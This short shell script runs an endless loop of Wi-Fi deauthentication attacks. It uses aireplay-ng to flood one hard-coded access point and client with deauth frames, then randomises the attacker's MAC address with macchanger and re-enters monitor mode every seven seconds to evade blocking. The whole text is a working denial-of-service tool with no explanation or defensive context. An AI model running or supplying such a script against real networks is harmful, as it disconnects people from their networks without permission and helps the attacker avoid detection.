
while true
do 
	aireplay-ng --deauth 100 -a B0:BE:76:70:E6:30 -c 0A:39:2C:97:D2:C6 wlan0
	ifconfig wlan0 down 
	macchanger -r wlan0 | grep New MAC
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	sleep 7
done
	
	
